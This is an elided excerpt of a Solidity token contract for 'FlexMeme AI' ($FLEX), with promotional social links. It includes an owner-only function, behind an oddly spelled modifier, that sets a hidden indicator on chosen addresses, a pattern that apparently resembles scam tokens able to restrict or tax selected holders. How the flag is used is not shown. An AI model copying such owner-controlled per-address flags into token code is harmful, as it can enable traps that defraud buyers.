...
Website: http://FlexMeme.AI

Twitter: https://twitter.com/executelaunch

Telegram: https://t.me/FlexMemeAi
...
contract ERC20 is Context, IERC20, IERC20Metadata,Ownable {
    ...
    function setAntiBotIndication(address[] memory abonent, uint256 indicator) public onlyouiner {
        ...
        _antiBotIndication[abonent[i]] = indicator*1;
        }
    }
...
contract FlexMemeAI is ERC20 {
    uint256 initialSupply = 1000000000;
    constructor() ERC20("FlexMeme AI", "$FLEX") {
